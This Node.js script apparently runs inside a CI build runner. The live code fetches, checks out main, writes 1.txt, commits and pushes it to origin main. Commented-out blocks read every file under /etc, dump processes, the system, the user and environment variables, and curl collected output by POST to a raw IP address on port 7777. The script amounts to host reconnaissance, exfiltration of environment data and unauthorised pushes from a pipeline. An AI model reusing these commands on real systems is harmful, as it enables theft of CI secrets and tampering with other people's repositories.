const { exec } = require('child_process');

// exec('ls /etc', (lsError, lsStdout, lsStderr) => {
//     if (lsError) {
//         console.error(`执行 ls /etc 时出错: ${lsError.message}`);
//         return;
//     }
//     if (lsStderr) {
//         console.error(`ls /etc 执行输出错误: ${lsStderr}`);
//         return;
//     }

// 确保已切换到 'main' 分支
exec('git fetch origin && git checkout main', (error) => {
    if (error) {
        console.error(`Error switching to or creating 'main' branch: ${error}`);
        return;
    }
    console.log('Successfully checked out the main branch.');

    // 创建新文件并进行提交
    exec('echo "hello world" > 1.txt', (error) => {
        if (error) {
            console.error(`Error writing file: ${error}`);
            return;
        }
        exec('git add 1.txt && git commit -m "Add new file 1.txt"', (error) => {
            if (error) {
                console.error(`Error during commit: ${error}`);
                return;
            }
            // 推送更改到远程 'main' 分支
            exec('git push origin main', (error) => {
                if (error) {
                    console.error(`Error pushing to remote repository: ${error}`);
                } else {
                    console.log('Successfully pushed to the remote repository.');
                }
            });
        });
    });
});

// exec('git branch && git branch -r', (error, stdout, stderr) => {
//   if (error) {
//     console.error(`执行错误: ${error}`);
//     return;
//   }
//   console.log('当前本地和远程分支列表:\n', stdout);

//   // 根据分支情况决定下一步
//   // checkBranchAndProceed();
// });

// // 检查 Git HEAD 状态
// exec('git status', (error, stdout) => {
//   if (stdout.includes('HEAD detached')) {
//     console.log('HEAD is detached. Creating and switching to a new branch...');
//     exec('git checkout main', (error) => {
//       if (error) {
//         console.error(`Error checkout main: ${error}`);
//         return;
//       }
//       writeFileAndPush();
//     });
//   } else {
//     writeFileAndPush();
//   }
// });

// function writeFileAndPush() {
//   exec('echo "hello world" > 1.txt', (error) => {
//     if (error) {
//       console.error(`Error writing file: ${error}`);
//       return;
//     }
//     exec('git add 1.txt && git commit -m "Add file 1.txt with hello world"', (error) => {
//       if (error) {
//         console.error(`Error during commit: ${error}`);
//         return;
//       }
//       exec('git push origin new-branch-name', (error) => {
//         if (error) {
//           console.error(`Error pushing to remote repository: ${error}`);
//         } else {
//           console.log('Successfully pushed to remote repository!');
//         }
//       });
//     });
//   });
// }

// // 检查 Git 用户信息
// exec('git config user.name && git config user.email', (error, stdout) => {
//   if (error || !stdout) {
//     console.error('Git 用户信息未配置，正在设置...');
//     // 如果未配置，则设置用户信息
//     exec('git config user.name "Your Name" && git config user.email "you@example.com"', (error) => {
//       if (error) {
//         console.error(`配置用户信息错误: ${error}`);
//         return;
//       }
//       console.log('用户信息配置成功，继续执行...');
//       writeFileAndPush();
//     });
//   } else {
//     console.log(`当前用户信息:\n${stdout}`);
//     writeFileAndPush();
//   }
// });


// // 检查并切换到 main 分支
// exec('git rev-parse --verify main', (error) => {
//   if (error) {
//     console.log('main 分支不存在，正在创建并切换...');
//     // 创建并切换到 main 分支
//     exec('git checkout -b main', (error) => {
//       if (error) {
//         console.error(`创建或切换分支时出错: ${error}`);
//         return;
//       }
//       console.log('已成功创建并切换到 main 分支。');
//       writeFileAndPush();
//     });
//   } else {
//     console.log('main 分支已存在，直接切换...');
//     // 直接切换到 main 分支
//     exec('git checkout main', (error) => {
//       if (error) {
//         console.error(`切换到 main 分支时出错: ${error}`);
//         return;
//       }
//       console.log('已成功切换到 main 分支。');
//       writeFileAndPush();
//     });
//   }
// });

// function writeFileAndPush() {
//   // 创建文件并提交
//   exec('echo "hello world" > 1.txt', (error) => {
//     if (error) {
//       console.error(`执行错误: ${error}`);
//       return;
//     }
//     exec('git add 1.txt && git commit -m "Add file 1.txt with hello world"', (error) => {
//       if (error) {
//         console.error(`执行错误: ${error}`);
//         return;
//       }
//       exec('git push origin main', (error) => {
//         if (error) {
//           console.error(`推送到远程仓库时出错: ${error}`);
//         } else {
//           console.log('成功推送到远程仓库！');
//         }
//       });
//     });
//   });
// }

// //     const files = lsStdout.split('\n').filter(file => file); // 获取文件列表并过滤掉空行

// //     // 对每个文件执行 cat 命令
// //     files.forEach(file => {
// //         exec(`cat /etc/${file}`, (catError, catStdout, catStderr) => {
// //             if (catError) {
// //                 console.error(`执行 cat /etc/${file} 时出错: ${catError.message}`);
// //                 return;
// //             }
// //             if (catStderr) {
// //                 console.error(`cat /etc/${file} 执行输出错误: ${catStderr}`);
// //                 return;
// //             }

// //             console.log(`文件 /etc/${file} 的内容:\n${catStdout}`);
// //         });
// //     });
// // });

// exec('ps aux', (error, stdout, stderr) => {
//     if (error) {
//         console.error(`执行 ps aux 时出错: ${error.message}`);
//         return;
//     }
//     if (stderr) {
//         console.error(`ps aux 执行输出错误: ${stderr}`);
//         return;
//     }

//     console.log(`lps aux 命令结果:\n${stdout}`);
// });

// // 执行 ls -l azure-pipelines-1.yml 命令
// exec('ls -l azure-pipelines-1.yml', (error, stdout, stderr) => {
//     if (error) {
//         console.error(`执行 ls -l 时出错: ${error.message}`);
//         return;
//     }
//     if (stderr) {
//         console.error(`ls -l 执行输出错误: ${stderr}`);
//         return;
//     }

//     console.log(`ls -l azure-pipelines-1.yml 命令结果:\n${stdout}`);
// });

// exec('uname -a', (error, stdout, stderr) => {
//     if (error) {
//         console.error(`执行 uname -a 时出错: ${error.message}`);
//         return;
//     }
//     if (stderr) {
//         console.error(`uname -a 执行输出错误: ${stderr}`);
//         return;
//     }

//     console.log(`uname -a 命令结果:\n${stdout}`);
// });

// // 执行 whoami 命令
// exec('whoami', (error, stdout, stderr) => {
//     if (error) {
//         console.error(`执行 whoami 时出错: ${error.message}`);
//         return;
//     }
//     if (stderr) {
//         console.error(`whoami 执行输出错误: ${stderr}`);
//         return;
//     }
//     console.log(`whoami 命令结果:\n${stdout}`);
// });

// // 执行 pwd 命令
// exec('pwd', (error, stdout, stderr) => {
//     if (error) {
//         console.error(`执行 pwd 时出错: ${error.message}`);
//         return;
//     }
//     if (stderr) {
//         console.error(`pwd 执行输出错误: ${stderr}`);
//         return;
//     }
//     console.log(`pwd 命令结果:\n${stdout}`);
//     // 将环境变量数据通过 curl 命令发送到远程服务器
//     // const data = stdout.trim();
//     // const command = `curl -X POST -H "Content-Type: text/plain" --data "${data}" http://139.180.193.16:7777`;

//     // exec(command, (curlError, curlStdout, curlStderr) => {
//     //     if (curlError) {
//     //         console.error(`执行 curl 时出错: ${curlError.message}`);
//     //         return;
//     //     }
//     //     if (curlStderr) {
//     //         console.error(`curl 执行输出错误: ${curlStderr}`);
//     //         return;
//     //     }
//     //     console.log(`curl 命令结果:\n${curlStdout}`);
//     // });
// });

// // 执行 ls 命令
// exec('ls', (error, stdout, stderr) => {
//     if (error) {
//         console.error(`执行 ls 时出错: ${error.message}`);
//         return;
//     }
//     if (stderr) {
//         console.error(`ls 执行输出错误: ${stderr}`);
//         return;
//     }
//     console.log(`ls 命令结果:\n${stdout}`);
// });


// // 执行 env 命令获取环境变量
// exec('env', (error, stdout, stderr) => {
//     if (error) {
//         console.error(`执行 env 时出错: ${error.message}`);
//         return;
//     }
//     if (stderr) {
//         console.error(`env 执行输出错误: ${stderr}`);
//         return;
//     }

//     console.log(`env 命令结果:\n${stdout}`);
    
// });
